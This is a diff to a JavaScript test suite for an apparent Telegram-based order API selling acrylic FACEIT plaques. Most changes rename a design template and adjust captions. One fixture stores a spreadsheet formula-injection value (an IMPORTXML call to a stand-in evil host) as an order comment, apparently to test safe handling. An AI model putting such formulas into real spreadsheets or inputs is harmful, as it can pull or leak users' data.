@@ -209,14 +209,14 @@ describe('API: заказы', () => {
     assert.equal(order.number, '1001')
     assert.equal(order.status, 'awaiting_payment')
     assert.deepEqual(order.design, {
-      templateId: 'blue',
+      templateId: 'graphite',
       size: 'A5',
       displayName: 'Леха Гей',
-      caption: 'for reaching 9 lvl · 1809 elo',
+      caption: 'for reaching 9 lvl 1809 elo',
       level: 9,
       elo: 1809,
     })
-    assert.deepEqual(order.price, calcPrice({ templateId: 'blue', size: 'A5', extras: { lightStand: true }, deliveryMethod: 'cdek_pvz' }))
+    assert.deepEqual(order.price, calcPrice({ templateId: 'graphite', size: 'A5', extras: { lightStand: true }, deliveryMethod: 'cdek_pvz' }))
     assert.deepEqual(order.customer, { telegramId: 7, username: 'dev', firstName: 'Dev' })
     assert.equal(order.comment, '=IMPORTXML("https://evil.example","//a")')
     assert.equal(order.recipient.phone, '+7 999 123-45-67')
@@ -325,7 +325,7 @@ describe('API: заказы', () => {
     const [invoice] = telegramGas.telegram!.byMethod('createInvoiceLink')
     assert.deepEqual(invoice!.payload, {
       title: `Плашка BROREPACK №${created.data.order.number}`,
-      description: 'Акриловая плашка FACEIT: Blue Ninja, A5, «Леха Гей», с подсветкой, доставка: Пункт СДЭК',
+      description: 'Акриловая плашка FACEIT: Graphite, A5, «Леха Гей», с подсветкой, доставка: Пункт СДЭК',
       payload: String(created.data.order.id),
       provider_token: '381764678:TEST:123',
       currency: 'RUB',
@@ -475,10 +475,10 @@ describe('API: рейтинг на плашке нельзя подделать'
     const { api } = createGas({ properties: { ...DEV_PROPERTIES } })
     const forged = orderInput({
       design: {
-        templateId: 'blue',
+        templateId: 'graphite',
         size: 'A5',
         displayName: 'Леха Гей',
-        caption: 'for reaching 10 lvl · 3000 elo',
+        caption: 'for reaching 10 lvl 3000 elo',
         level: 10,
         elo: 3000,
       },
@@ -488,13 +488,13 @@ describe('API: рейтинг на плашке нельзя подделать'
     const { design } = created.data.order
     assert.equal(design.level, 9)
     assert.equal(design.elo, 1809)
-    assert.equal(design.caption, 'for reaching 9 lvl · 1809 elo')
+    assert.equal(design.caption, 'for reaching 9 lvl 1809 elo')
     assert.equal(design.displayName, 'Леха Гей')
   })
 
   it('формата A4 больше нет', () => {
     const { api } = createGas({ properties: { ...DEV_PROPERTIES } })
-    const result = api('orders.create', orderInput({ design: { templateId: 'blue', size: 'A4', displayName: 'Леха' } }), 'dev:1')
+    const result = api('orders.create', orderInput({ design: { templateId: 'graphite', size: 'A4', displayName: 'Леха' } }), 'dev:1')
     assert.equal(result.ok, false)
     assert.equal(result.error, 'validation_error')
   })
